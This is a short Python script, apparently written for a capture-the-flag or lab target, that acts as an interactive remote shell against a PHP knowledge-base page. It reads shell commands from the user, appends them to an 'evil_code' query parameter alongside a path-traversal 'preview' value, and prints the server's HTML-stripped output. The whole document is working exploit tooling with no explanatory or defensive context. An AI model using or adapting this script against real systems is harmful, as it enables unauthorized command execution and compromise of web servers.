import requests
import re


website = "https://xviest.bit.demo-cert.sk/kb.php?preview=../new/{}.html{}"

filename = "202310052310"

options = "&dynamic_preview=1&evil_code="

while 1:
    code = str(input("shell commands: "))
    options += code
    r = requests.get(website.format(filename, options))
    print("Website url: ", r.url)
    if r.status_code == 200:
        output = re.sub(r'<.*?>', '', r.text)
        print("\n\n\n")
        print(output)
        options = "&dynamic_preview=1&evil_code="
    else:
        print("Error: {}".format(r.status_code))
        break